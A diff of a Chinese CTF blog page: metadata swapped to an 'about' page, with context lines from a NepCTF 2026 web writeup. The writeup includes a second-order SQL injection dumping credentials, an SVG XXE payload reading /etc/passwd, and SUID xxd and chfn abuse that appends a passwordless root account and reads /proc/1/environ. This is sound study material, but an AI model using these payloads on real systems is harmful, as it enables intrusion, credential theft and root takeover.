@@ -6,34 +6,17 @@
   <meta name="keywords" content=" php反序列化 , ssrf , vite , sql二次注入 , svg打xxe , php filter chain , suid提权 ">
   <meta name="description" content="nepctf2026 | MIXBP">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="docker学习初识docker安装docker12345678910# yum包更新yum update# 安装所需要的软件包yum install -y yum-utils device-mapper-persistent-date lvm2# 设置yum源yum-config-manager --add-repo https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;cento">
-<meta property="og:type" content="article">
-<meta property="og:title" content="docker学习">
-<meta property="og:url" content="https://mixbp.github.io/2026/09/14/docker%E5%AD%A6%E4%B9%A0/index.html">
+<meta name="description" content="关于我MIXBP，Web 安全学习者，主攻 CTF Web 方向。  🎯 常打 BUUCTF、ctfshow、各类线下&#x2F;线上赛 📚 学习方向：PHP&#x2F;Java&#x2F;Python 安全、渗透测试、代码审计 🔗 GitHub：MIXBP  关于博客记录 CTF 刷题 writeup、比赛复现与安全学习笔记，内容仅供学习交流。 转载请注明来源，欢迎对文章中的引用来源进行考">
+<meta property="og:type" content="website">
+<meta property="og:title" content="about">
+<meta property="og:url" content="https://mixbp.github.io/about/index.html">
 <meta property="og:site_name" content="MIXBP">
-<meta property="og:description" content="docker学习初识docker安装docker12345678910# yum包更新yum update# 安装所需要的软件包yum install -y yum-utils device-mapper-persistent-date lvm2# 设置yum源yum-config-manager --add-repo https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;cento">
+<meta property="og:description" content="关于我MIXBP，Web 安全学习者，主攻 CTF Web 方向。  🎯 常打 BUUCTF、ctfshow、各类线下&#x2F;线上赛 📚 学习方向：PHP&#x2F;Java&#x2F;Python 安全、渗透测试、代码审计 🔗 GitHub：MIXBP  关于博客记录 CTF 刷题 writeup、比赛复现与安全学习笔记，内容仅供学习交流。 转载请注明来源，欢迎对文章中的引用来源进行考">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-1.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-2.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-3.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-5.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-4.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-6.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-7.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-8.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-9.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-10.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-11.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-12.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-13.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-14.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-15.png">
-<meta property="article:published_time" content="2026-09-14T04:28:32.000Z">
-<meta property="article:modified_time" content="2026-09-18T11:22:32.136Z">
+<meta property="article:published_time" content="2026-11-16T09:30:00.000Z">
+<meta property="article:modified_time" content="2026-11-16T09:08:41.064Z">
 <meta property="article:author" content="MIXBP">
-<meta property="article:tag" content="docker">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-1.png">
 
 
 <link rel="icon" href="/img/favicon.png">
@@ -58,7 +41,8 @@
 
 <script src="/js/iconfont.js?v=1.1.0" ></script>
 
-<meta name="generator" content="Hexo 7.3.0"></head>
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="MIXBP" type="application/atom+xml">
+</head>
 <div style="display: none">
   <input class="theme_disqus_on" value="false">
   <input class="theme_preload_comment" value="">
@@ -2215,7 +2199,7 @@
         
         <a  class="全部文章 java安全学习 "
            href="/2026/05/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6/"
-           data-tag="java反序列化,JNDI,RMI"
+           data-tag="JNDI,RMI,java反序列化"
            data-author="" >
             <span class="post-title" title="java反序列化进阶">java反序列化进阶</span>
             <span class="post-date" title="2026-05-07 01:23:24">2026/05/07</span>
@@ -2737,7 +2721,7 @@
         
         <a  class="全部文章 比赛复现 "
            href="/2025/05/22/%E2%80%9C%E8%BD%A9%E8%BE%95%E6%9D%AF%E2%80%9D%E4%BA%91%E7%9B%BE%E7%A0%BA%E5%89%91CTF%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%8E%B0/"
-           data-tag="ssti,RCE,ssrf,sql"
+           data-tag="ssti,ssrf,RCE,sql"
            data-author="" >
             <span class="post-title" title="“轩辕杯”云盾砺剑CTF挑战赛复现">“轩辕杯”云盾砺剑CTF挑战赛复现</span>
             <span class="post-date" title="2025-05-22 23:37:59">2025/05/22</span>
@@ -2800,7 +2784,7 @@
         
         <a  class="全部文章 刷题笔记 "
            href="/2025/05/20/watevrCTF-2019-PickleStore/"
-           data-tag="反弹shell,python反序列化,外带数据,pickle反序列化"
+           data-tag="python反序列化,反弹shell,外带数据,pickle反序列化"
            data-author="" >
             <span class="post-title" title="watevrCTF-2019-PickleStore">watevrCTF-2019-PickleStore</span>
             <span class="post-date" title="2025-05-20 16:38:08">2025/05/20</span>
@@ -2872,7 +2856,7 @@
         
         <a  class="全部文章 刷题笔记 "
            href="/2025/05/11/SWPU2019-Web4/"
-           data-tag="代码审计,堆叠注入,时间盲注,16进制加SQL预处理绕过,PDO"
+           data-tag="代码审计,堆叠注入,16进制加SQL预处理绕过,时间盲注,PDO"
            data-author="" >
             <span class="post-title" title="SWPU2019-Web4">SWPU2019-Web4</span>
             <span class="post-date" title="2025-05-11 21:25:26">2025/05/11</span>
@@ -3169,7 +3153,7 @@
         
         <a  class="全部文章 刷题笔记 "
            href="/2025/04/15/BJDCTF2020-EzPHP/"
-           data-tag="代码审计,php特性,sha1绕过,extract,$_SERVER[&#39;QUERY_STRING&#39;],preg_match,create_function(),取反绕过单双引号过滤"
+           data-tag="php特性,代码审计,sha1绕过,extract,$_SERVER[&#39;QUERY_STRING&#39;],preg_match,create_function(),取反绕过单双引号过滤"
            data-author="" >
             <span class="post-title" title="BJDCTF2020-EzPHP">BJDCTF2020-EzPHP</span>
             <span class="post-date" title="2025-04-15 22:02:22">2025/04/15</span>
@@ -3187,7 +3171,7 @@
         
         <a  class="全部文章 比赛复现 "
            href="/2025/04/15/TGCTF-2025%E5%A4%8D%E7%8E%B0/"
-           data-tag="sql注入,RCE,upload,明文攻击,CVE,目录穿越,内存马,时间盲注,压缩文件修复,时间帧隐写,docker"
+           data-tag="sql注入,upload,RCE,明文攻击,时间盲注,CVE,目录穿越,内存马,压缩文件修复,时间帧隐写,docker"
            data-author="" >
             <span class="post-title" title="TGCTF-2025复现">TGCTF-2025复现</span>
             <span class="post-date" title="2025-04-15 14:10:07">2025/04/15</span>
@@ -3376,7 +3360,7 @@
         
         <a  class="全部文章 刷题笔记 "
            href="/2025/03/30/BJDCTF2020-EasySearch1/"
-           data-tag="swp泄露,md5碰撞,代码审计,Apache SSI 远程命令执行漏洞"
+           data-tag="代码审计,swp泄露,md5碰撞,Apache SSI 远程命令执行漏洞"
            data-author="" >
             <span class="post-title" title="BJDCTF2020-EasySearch1">BJDCTF2020-EasySearch1</span>
             <span class="post-date" title="2025-03-30 14:24:01">2025/03/30</span>
@@ -4003,6 +3987,7 @@
     <div class="article-meta">
         
         <span>字数:4.9k</span>
+        <span>预计阅读 24 分钟</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -4072,7 +4057,7 @@
 <p>由于 vite 的 <code>fetchModule</code> 函数直接绕过了 <code>server.fs</code> 的安全限制，导致攻击者可以任意的使用 <code>file://</code> 协议来读取所有的目标服务器的文件。</p>
 <hr>
 <h2 id="web？re？"><a href="#web？re？" class="headerlink" title="web？re？"></a>web？re？</h2><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>首先随便注册一个账号，登陆后可以发现基本没有功能，唯一算是功能的点就这个用户推荐的功能</p>
-<p><img src="/../image/nepctf2026-1.png"></p>
+<p><img loading="lazy" src="/../image/nepctf2026-1.png"></p>
 <p>猜测这个功能后端是由sql实现的，可能存在注入，但是没有注入点，试试二次注入</p>
 <p>这里的同域名用户可以看到与邮箱有关</p>
 <p>在注册之后抓包，这里应该是截取@后面的部分到数据库中匹配</p>
@@ -4085,15 +4070,15 @@
 <p>最终执行的SQL</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> email <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>, username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> users<span class="hljs-comment">--%&#x27;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/../image/nepctf2026-2.png"></p>
+<p><img loading="lazy" src="/../image/nepctf2026-2.png"></p>
 <p>可以看到在用户推荐界面爆出admin账号密码</p>
-<p><img src="/../image/nepctf2026-3.png"></p>
+<p><img loading="lazy" src="/../image/nepctf2026-3.png"></p>
 <p>然后拿到admin账号密码就可以到下一步了</p>
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">admin<br>AdminP<span class="hljs-title">@ssw0rd</span><span class="hljs-title">!2026</span><br></code></pre></td></tr></table></figure>
 
 <hr>
 <h3 id="svg打ssrf"><a href="#svg打ssrf" class="headerlink" title="svg打ssrf"></a>svg打ssrf</h3><p>管理员页面允许上传文件</p>
-<p><img src="/../image/nepctf2026-4.png"></p>
+<p><img loading="lazy" src="/../image/nepctf2026-4.png"></p>
 <p>这里可以用svg去打xxe</p>
 <p>读个&#x2F;etc&#x2F;passwd试试</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">flag</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;800&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;40&quot;</span> <span class="hljs-attr">font-size</span>=<span class="hljs-string">&quot;24&quot;</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">&quot;red&quot;</span>&gt;</span><span class="hljs-symbol">&amp;flag;</span><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure>
@@ -4156,7 +4141,7 @@
 <h3 id="拿flag"><a href="#拿flag" class="headerlink" title="拿flag"></a>拿flag</h3><h4 id="预期解-获取二进制文件-不需要提权"><a href="#预期解-获取二进制文件-不需要提权" class="headerlink" title="预期解 获取二进制文件 不需要提权"></a>预期解 获取二进制文件 不需要提权</h4><p>发现xxd是suid文件，用来查看root的环境变量与历史命令 </p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">xxd <span class="hljs-regexp">/root/</span>.bashrc<br>xxd <span class="hljs-regexp">/root/</span>.bash_history<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../image/nepctf2026-5.png"></p>
+<p><img loading="lazy" src="/../image/nepctf2026-5.png"></p>
 <p>发现历史命令执行了sendthef1ag，然后拉下来分析分析它会读取环境变量里面的SEND_KEY然后解密flag发送到80端口</p>
 <p>所以我们根本不用解密，我们只要设置好环境变量再运行一次，然后看日志即可</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">SEND_KEY</span>=97b2d087-c452-4a14-8a91-5a7035b4ab38<br>/usr/local/bin/sendthef1ag<br></code></pre></td></tr></table></figure>
@@ -4165,7 +4150,7 @@
 <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">xxd /<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/apache2/access.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure>
 
 <hr>
-<h4 id="非预期-读-proc-1-environ"><a href="#非预期-读-proc-1-environ" class="headerlink" title="非预期 读&#x2F;proc&#x2F;1&#x2F;environ"></a>非预期 读&#x2F;proc&#x2F;1&#x2F;environ</h4><h4 id="利用xxd反向模式拿root"><a href="#利用xxd反向模式拿root" class="headerlink" title="利用xxd反向模式拿root"></a>利用xxd反向模式拿root</h4><p><img src="/../image/nepctf2026-6.png"></p>
+<h4 id="非预期-读-proc-1-environ"><a href="#非预期-读-proc-1-environ" class="headerlink" title="非预期 读&#x2F;proc&#x2F;1&#x2F;environ"></a>非预期 读&#x2F;proc&#x2F;1&#x2F;environ</h4><h4 id="利用xxd反向模式拿root"><a href="#利用xxd反向模式拿root" class="headerlink" title="利用xxd反向模式拿root"></a>利用xxd反向模式拿root</h4><p><img loading="lazy" src="/../image/nepctf2026-6.png"></p>
 <p>步骤</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 枚举 SUID 文件</span><br>find / -xdev -<span class="hljs-built_in">type</span> f -perm -4000 2&gt;/dev/null<br><span class="hljs-comment"># 发现: -rwrr-xr-x 1 root root ... /usr/bin/xxd</span><br><br><span class="hljs-comment"># 2. 复制一份 passwd 到可写目录</span><br><span class="hljs-built_in">cp</span> /etc/passwd /tmp/passwd.nep<br><br><span class="hljs-comment"># 3. 追加一个空密码的 root 账户（neproot）</span><br><span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;\nneproot::0:0:NEP:/root:/bin/sh\n&#x27;</span> &gt;&gt; /tmp/passwd.nep<br><span class="hljs-comment"># 格式: 用户名::UID:GID:描述:家目录:shell</span><br><span class="hljs-comment">#       密码为空</span><br><br><span class="hljs-comment"># 4. 用 xxd -p 将 passwd 转成十六进制（正向模式）</span><br>/usr/bin/xxd -p -c 100000 /tmp/passwd.nep &gt; /tmp/passwd.nep.hex<br><span class="hljs-comment"># -p: 连续十六进制输出</span><br><span class="hljs-comment"># -c 100000: 每行100000字节，避免换行</span><br><br><span class="hljs-comment"># 5. 用 xxd -r 将十六进制还原并写入 /etc/passwd（关键！）</span><br>/usr/bin/xxd -r -p /tmp/passwd.nep.hex /etc/passwd<br><span class="hljs-comment"># xxd 以 root 权限写入 /etc/passwd</span><br><br><span class="hljs-comment"># 6. 切换到新账户（空密码）</span><br>su neproot -c <span class="hljs-string">&#x27;id&#x27;</span><br><span class="hljs-comment"># 输出: uid=0(root) gid=0(root) groups=0(root)</span><br></code></pre></td></tr></table></figure>
 
@@ -4183,12 +4168,12 @@
 <figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-regexp">/usr/</span>bin<span class="hljs-operator">/</span>chfn <span class="hljs-operator">-</span>p <span class="hljs-operator">-</span>c &#x27;python3 <span class="hljs-operator">-</span>c <span class="hljs-string">&quot;import os; os.setgid(0); os.setuid(0);</span><br><span class="hljs-string">print(open(<span class="hljs-subst">\&quot;</span>/proc/1/environ<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>rb<span class="hljs-subst">\&quot;</span>).read().replace(b<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\\</span>0<span class="hljs-subst">\&quot;</span>,b<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\\</span>n<span class="hljs-subst">\&quot;</span>).decode</span><br><span class="hljs-string">())&quot;</span>&#x27;<br></code></pre></td></tr></table></figure>
 
 <hr>
-<h4 id="利用so文件加载提权"><a href="#利用so文件加载提权" class="headerlink" title="利用so文件加载提权"></a>利用so文件加载提权</h4><p><img src="/../image/nepctf2026-7.png"></p>
+<h4 id="利用so文件加载提权"><a href="#利用so文件加载提权" class="headerlink" title="利用so文件加载提权"></a>利用so文件加载提权</h4><p><img loading="lazy" src="/../image/nepctf2026-7.png"></p>
 <hr>
 <h2 id="文档编辑系统"><a href="#文档编辑系统" class="headerlink" title="文档编辑系统"></a>文档编辑系统</h2><p>进入题目，发现是一个登录页面。尝试弱密码爆破admin管理员用户，可以很快知道管理员的密码是admin123</p>
 <p>拿到管理员密码后就可以登录管理员页面进一步寻找突破口。</p>
 <h3 id="Fastjson反序列化不出网利用"><a href="#Fastjson反序列化不出网利用" class="headerlink" title="Fastjson反序列化不出网利用"></a><strong>Fastjson反序列化不出网利用</strong></h3><p>登录管理员页面后发现是一个文档编辑保存系统，尝试抓包其中的一个接口。这里抓取的是**&#x2F;api&#x2F;admin&#x2F;doc&#x2F;batchUpdate**接口。查看传递的数据格式是json格式数据，在请求包中发现cookie里面用的是JSESSIONID，可以得知这是一个javaWeb。那么可以大胆猜测这个后台用了Fastjson组件来处理json数据。可以传入一个不完整的json数据来测试猜测是否正确。</p>
-<p><img src="/../image/nepctf2026-8.png"></p>
+<p><img loading="lazy" src="/../image/nepctf2026-8.png"></p>
 <p>得到了Fastjson的报错信息，可以传入一个简易的payload来探测一下。</p>
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br><span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>:<span class="hljs-string">&quot;java.util.HashMap&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
 
